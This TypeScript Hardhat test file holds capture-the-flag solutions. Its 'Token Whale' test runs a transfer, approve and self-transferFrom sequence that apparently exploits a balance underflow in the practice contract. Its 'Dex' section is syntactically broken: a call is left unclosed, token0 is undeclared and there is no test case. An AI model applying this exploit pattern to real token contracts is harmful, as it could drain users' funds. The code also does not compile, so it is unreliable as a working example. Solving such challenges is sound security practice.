import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";


let accounts: Signer[];
let contract: Contract;

describe("Solutions: Token Whale", () => {
    beforeEach((async () => {
        accounts = await ethers.getSigners();
        const factory = await ethers.getContractFactory("TokenWhaleChallenge");
        contract = await factory.deploy(accounts[0].getAddress());
    }))
    it("Solves the challenge", async () => {
        await contract.transfer(accounts[1].getAddress(), 510)
        await contract.connect(accounts[1]).approve(accounts[0].getAddress(), 1000)
        await contract.transferFrom(accounts[1].getAddress(), accounts[1].getAddress(), 500)
    })
})

describe("Solutions: Dex", () => {
    beforeEach((async () => {
        accounts = await ethers.getSigners();
        const factory = await ethers.getContractFactory("Dex");
        const tokenFactory = await ethers.getContractFactory("SwappableToken");
        contract = await factory.deploy(); 
        token0 = await tokenFactory.deploy(contract.getAddress(), "token0", "T0"
    }))
})